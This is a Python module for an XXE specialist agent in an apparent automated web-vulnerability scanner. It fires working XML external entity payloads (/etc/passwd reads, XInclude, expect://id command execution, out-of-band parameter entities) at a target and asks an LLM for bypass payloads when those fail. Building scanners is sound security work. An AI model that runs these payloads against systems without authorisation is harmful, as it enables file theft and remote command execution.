import logging
from typing import Dict, List, Optional, Any
import aiohttp
from bugtrace.agents.base import BaseAgent
from bugtrace.core.http_orchestrator import orchestrator, DestinationType
from bugtrace.agents.worker_pool import WorkerPool, WorkerConfig
from bugtrace.core.queue import queue_manager
from bugtrace.core.event_bus import EventType
from bugtrace.core.config import settings
from bugtrace.core.ui import dashboard
from bugtrace.core.validation_status import ValidationStatus, requires_cdp_validation
from bugtrace.reporting.standards import (
    get_cwe_for_vuln,
    get_remediation_for_vuln,
    normalize_severity,
)

logger = logging.getLogger(__name__)

class XXEAgent(BaseAgent):
    """
    Specialist Agent for XML External Entity (XXE).
    Target: Endpoints consuming XML.
    """

    def __init__(self, url: str, event_bus: Any = None):
        super().__init__(
            name="XXEAgent",
            role="XXE Specialist",
            event_bus=event_bus,
            agent_id="xxe_agent"
        )
        self.url = url
        self.MAX_BYPASS_ATTEMPTS = 5

        # Queue consumption mode (Phase 20)
        self._queue_mode = False
        self._worker_pool: Optional[WorkerPool] = None
        self._scan_context: str = ""

        # Expert deduplication: Track emitted findings by fingerprint
        self._emitted_findings: set = set()  # (url_normalized, vuln_signature)

    def _determine_validation_status(self, payload: str, evidence: str = "success") -> str:
        """
        Determine tiered validation status for XXE finding.

        TIER 1 (VALIDATED_CONFIRMED): Definitive proof
            - File content exfiltrated (/etc/passwd)
            - OOB callback received (Interactsh hit)
            - DTD loaded with external entity

        TIER 2 (PENDING_VALIDATION): Needs verification
            - Error-based XXE (shows path but not content)
            - Blind XXE without OOB confirmation
        """
        # TIER 1: File disclosure confirmed
        if "passwd" in payload or "root:x:" in evidence:
            logger.info(f"[{self.name}] File disclosure confirmed - VALIDATED_CONFIRMED")
            return ValidationStatus.VALIDATED_CONFIRMED.value

        # TIER 1: OOB callback triggered
        if "Triggered" in evidence or "oob" in evidence.lower():
            logger.info(f"[{self.name}] OOB callback confirmed - VALIDATED_CONFIRMED")
            return ValidationStatus.VALIDATED_CONFIRMED.value

        # TIER 1: DTD loaded successfully
        if "dtd" in payload.lower() and "loaded" in evidence.lower():
            logger.info(f"[{self.name}] DTD loaded confirmed - VALIDATED_CONFIRMED")
            return ValidationStatus.VALIDATED_CONFIRMED.value

        # TIER 1: Entity confirmed in response
        if "BUGTRACE_XXE_CONFIRMED" in evidence:
            logger.info(f"[{self.name}] Entity confirmation - VALIDATED_CONFIRMED")
            return ValidationStatus.VALIDATED_CONFIRMED.value

        # TIER 2: Error-based XXE (shows path but not file content)
        if "failed to load" in evidence.lower() or "no such file" in evidence.lower():
            logger.info(f"[{self.name}] Error-based XXE - PENDING_VALIDATION")
            return ValidationStatus.PENDING_VALIDATION.value

        # Default: High-confidence specialist trust
        logger.info(f"[{self.name}] XXE anomaly detected - VALIDATED_CONFIRMED (Specialist Trust)")
        return ValidationStatus.VALIDATED_CONFIRMED.value

    def _get_validation_status_from_evidence(self, evidence: Dict) -> str:
        """
        Determine validation status from evidence dictionary.

        Used by queue consumer for standardized event emission.
        """
        # TIER 1: File content exfiltrated
        if evidence.get("file_content"):
            return ValidationStatus.VALIDATED_CONFIRMED.value

        # TIER 1: OOB hit confirmed
        if evidence.get("oob_hit") or evidence.get("interactsh_hit"):
            return ValidationStatus.VALIDATED_CONFIRMED.value

        # TIER 1: DTD loaded successfully
        if evidence.get("dtd_loaded"):
            return ValidationStatus.VALIDATED_CONFIRMED.value

        # TIER 2: Error-based (needs verification)
        if evidence.get("error_based"):
            return ValidationStatus.PENDING_VALIDATION.value

        # Default: High-confidence
        return ValidationStatus.VALIDATED_CONFIRMED.value
        
    def _get_initial_xxe_payloads(self) -> list:
        """Get baseline XXE payloads for testing."""
        return [
            '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>',
            '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe "BUGTRACE_XXE_CONFIRMED" >]><foo>&xxe;</foo>',
            '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe PUBLIC "bar" "file:///etc/passwd" >]><foo>&xxe;</foo>',
            '<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/passwd" parse="text"/></foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///nonexistent_bugtrace_test">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % param_xxe SYSTEM "http://127.0.0.1:5150/nonexistent_oob"> %param_xxe;]><foo>test</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>'
        ]

    async def _test_heuristic_payloads(self, session) -> tuple:
        """Test initial payloads and return (successful_payloads, best_payload)."""
        successful_payloads, best_payload = [], None
        for p in self._get_initial_xxe_payloads():
            if await self._test_xml(session, p):
                successful_payloads.append(p)
                if not best_payload or ("passwd" in p and "passwd" not in best_payload):
                    best_payload = p
        return successful_payloads, best_payload

    async def _try_llm_bypass(self, session, previous_response: str) -> tuple:
        """Try LLM-driven bypass. Returns (successful_payloads, best_payload)."""
        for attempt in range(self.MAX_BYPASS_ATTEMPTS):
            dashboard.log(f"[{self.name}] 🔄 Bypass attempt {attempt+1}/{self.MAX_BYPASS_ATTEMPTS}", "INFO")
            strategy = await self._llm_get_strategy(previous_response)
            if not strategy or not strategy.get('payload'):
                break
            payload = strategy['payload']
            if await self._test_xml(session, payload):
                return [payload], payload
        return [], None

    async def run_loop(self) -> Dict:
        logger.info(f"[{self.name}] Testing XML Injection on {self.url}")

        # Use orchestrator for lifecycle-tracked connections
        async with orchestrator.session(DestinationType.TARGET) as session:
            # Phase 1: Heuristic Checks
            successful_payloads, best_payload = await self._test_heuristic_payloads(session)

            # Phase 2: LLM-Driven Bypass (if heuristics failed)
            if not successful_payloads:
                bypass_payloads, bypass_best = await self._try_llm_bypass(session, "")
                successful_payloads.extend(bypass_payloads)
                best_payload = bypass_best

        if successful_payloads:
            return {"vulnerable": True, "findings": [self._create_finding(best_payload, successful_payloads)]}

        return {"vulnerable": False, "findings": []}

    def _create_finding(self, payload: str, successful_payloads: List[str] = None) -> Dict:
        severity = "HIGH"
        if "passwd" in payload or "XInclude" in payload:
            severity = "CRITICAL"

        return {
            "type": "XXE",
            "url": self.url,
            "payload": payload,
            "description": f"XML External Entity (XXE) vulnerability detected. Payload allows reading local files or triggering SSRF. Severity: {severity}",
            "severity": severity,
            "validated": True,
            "status": self._determine_validation_status(payload),
            "successful_payloads": successful_payloads or [payload],
            "reproduction": f"curl -X POST '{self.url}' -H 'Content-Type: application/xml' -d '{payload[:150]}...'",
            "cwe_id": get_cwe_for_vuln("XXE"),
            "remediation": get_remediation_for_vuln("XXE"),
            "cve_id": "N/A",
            "http_request": f"POST {self.url}\nContent-Type: application/xml\n\n{payload[:200]}",
            "http_response": "Local file content or entity reference detected in response",
        }

    async def _test_xml(self, session, xml_body) -> bool:
        try:
            dashboard.update_task("XXE Agent", status="Injecting Entity...")
            headers = {'Content-Type': 'application/xml'}

            self.think(f"Testing Payload: {xml_body[:60]}...")

            async with session.post(self.url, data=xml_body, headers=headers, timeout=5) as resp:
                text = await resp.text()
                return self._check_xxe_indicators(text)

        except Exception as e:
            logger.debug(f"XXE Request failed: {e}")
            return False

    def _check_xxe_indicators(self, text: str) -> bool:
        """Check response text for XXE success indicators."""
        # Success Indicators
        indicators = [
            "root:x:0:0",                  # /etc/passwd success
            "BUGTRACE_XXE_CONFIRMED",      # Internal Entity success
            "[extensions] found",          # Win.ini success (if testing windows)
            "failed to load external entity", # Error-based success (often confirms processing)
            "No such file or directory",    # Error-based success
            "uid=0(root)",                  # RCE success (expect://)
            "XXE OOB Triggered"             # Blind Detection (Simulated)
        ]

        # Check indicators
        for ind in indicators:
            if ind in text:
                self.think(f"SUCCESS: Indicator '{ind}' found in response.")
                return True

        # Check for XInclude reflection (if we tried XInclude)
        if "root:x:0:0" in text:
            self.think("SUCCESS: /etc/passwd content found (XInclude or Entity).")
            return True

        return False
        
    async def _llm_get_strategy(self, previous_response: str) -> Dict:
        """Call LLM to generate or refine the XXE bypass strategy."""
        system_prompt = self.system_prompt
        user_prompt = f"Target URL: {self.url}"
        if previous_response:
            user_prompt += f"\n\nPrevious attempt failed. Response snippet:\n{previous_response[:1000]}"
            user_prompt += "\n\nTry a different bypass (e.g. XInclude, parameter entities, UTF-16 encoding)."

        from bugtrace.core.llm_client import llm_client
        response = await llm_client.generate(
            prompt=user_prompt,
            system_prompt=system_prompt,
            module_name="XXE_AGENT"
        )

        from bugtrace.utils.parsers import XmlParser
        tags = ["payload", "vulnerable", "context", "confidence"]
        return XmlParser.extract_tags(response, tags)

    # =========================================================================
    # QUEUE CONSUMPTION MODE (Phase 20)
    # =========================================================================

    async def start_queue_consumer(self, scan_context: str) -> None:
        """
        Start XXEAgent in queue consumer mode.

        Spawns a worker pool that consumes from the xxe queue and
        processes findings in parallel.
        """
        self._queue_mode = True
        self._scan_context = scan_context

        config = WorkerConfig(
            specialist="xxe",
            pool_size=settings.WORKER_POOL_DEFAULT_SIZE,
            process_func=self._process_queue_item,
            on_result=self._handle_queue_result,
            shutdown_timeout=settings.WORKER_POOL_SHUTDOWN_TIMEOUT
        )

        self._worker_pool = WorkerPool(config)

        if self.event_bus:
            self.event_bus.subscribe(
                EventType.WORK_QUEUED_XXE.value,
                self._on_work_queued
            )

        logger.info(f"[{self.name}] Starting queue consumer with {config.pool_size} workers")
        await self._worker_pool.start()

    async def _process_queue_item(self, item: dict) -> Optional[Dict]:
        """Process a single item from the xxe queue."""
        finding = item.get("finding", {})
        url = finding.get("url")

        if not url:
            logger.warning(f"[{self.name}] Invalid queue item: missing url")
            return None

        self.url = url
        return await self._test_single_url_from_queue(url, finding)

    async def _test_single_url_from_queue(self, url: str, finding: dict) -> Optional[Dict]:
        """Test a single URL from queue for XXE."""
        try:
            # Use orchestrator for lifecycle-tracked connections
            async with orchestrator.session(DestinationType.TARGET) as session:
                # Test with heuristic payloads
                successful_payloads, best_payload = await self._test_heuristic_payloads(session)

                if successful_payloads:
                    return self._create_finding(best_payload, successful_payloads)

                # Try LLM bypass if heuristics failed
                bypass_payloads, bypass_best = await self._try_llm_bypass(session, "")
                if bypass_payloads:
                    return self._create_finding(bypass_best, bypass_payloads)

                return None
        except Exception as e:
            logger.error(f"[{self.name}] Queue item test failed: {e}")
            return None

    def _generate_xxe_fingerprint(self, url: str) -> tuple:
        """
        Generate XXE finding fingerprint for expert deduplication.

        XXE in XML endpoints is typically tied to the endpoint itself,
        not specific parameters. Multiple findings on the same XML endpoint
        are considered duplicates.

        Args:
            url: Target URL

        Returns:
            Tuple of (normalized_url, vuln_type) for deduplication
        """
        from urllib.parse import urlparse, parse_qs

        parsed = urlparse(url)

        # Normalize URL: remove query params (productId doesn't matter for XXE)
        # /catalog/product?productId=2 → /catalog/product
        # /catalog/product?productId=10 → /catalog/product (SAME VULNERABILITY)
        normalized_path = parsed.path.rstrip('/')

        # XXE signature: (scheme, host, path)
        # This groups all XXE findings on the same XML endpoint together
        fingerprint = (parsed.scheme, parsed.netloc, normalized_path, "XXE")

        return fingerprint

    async def _handle_queue_result(self, item: dict, result: Optional[Dict]) -> None:
        """Handle completed queue item processing."""
        if result is None:
            return

        # Build evidence from result for validation status determination
        payload = result.get("payload", "")
        http_response = result.get("http_response", "")
        evidence = {
            "file_content": "root:x:" in http_response or "passwd" in payload,
            "oob_hit": "oob" in http_response.lower() or "triggered" in http_response.lower(),
            "dtd_loaded": "dtd" in payload.lower(),
            "error_based": "failed to load" in http_response.lower() or "no such file" in http_response.lower(),
        }

        # Determine validation status
        status = self._get_validation_status_from_evidence(evidence)

        # EXPERT DEDUPLICATION: Check if we already emitted this finding
        url = result.get("url", "")
        fingerprint = self._generate_xxe_fingerprint(url)

        if fingerprint in self._emitted_findings:
            logger.info(f"[{self.name}] Skipping duplicate XXE finding: {url} (already reported)")
            return

        # Mark as emitted
        self._emitted_findings.add(fingerprint)

        if self.event_bus and settings.WORKER_POOL_EMIT_EVENTS:
            await self.event_bus.emit(EventType.VULNERABILITY_DETECTED, {
                "specialist": "xxe",
                "finding": {
                    "type": "XXE",
                    "url": result.get("url"),
                    "payload": result.get("payload"),
                },
                "status": status,
                "validation_requires_cdp": status == ValidationStatus.PENDING_VALIDATION.value,
                "scan_context": self._scan_context,
            })

        logger.info(f"[{self.name}] Confirmed XXE: {result.get('url')} [status={status}]")

    async def _on_work_queued(self, data: dict) -> None:
        """Handle work_queued_xxe notification (logging only)."""
        logger.debug(f"[{self.name}] Work queued: {data.get('finding', {}).get('url', 'unknown')}")

    async def stop_queue_consumer(self) -> None:
        """Stop queue consumer mode gracefully."""
        if self._worker_pool:
            await self._worker_pool.stop()
            self._worker_pool = None

        if self.event_bus:
            self.event_bus.unsubscribe(
                EventType.WORK_QUEUED_XXE.value,
                self._on_work_queued
            )

        self._queue_mode = False
        logger.info(f"[{self.name}] Queue consumer stopped")

    def get_queue_stats(self) -> dict:
        """Get queue consumer statistics."""
        if not self._worker_pool:
            return {"mode": "direct", "queue_mode": False}

        return {
            "mode": "queue",
            "queue_mode": True,
            "worker_stats": self._worker_pool.get_stats(),
        }
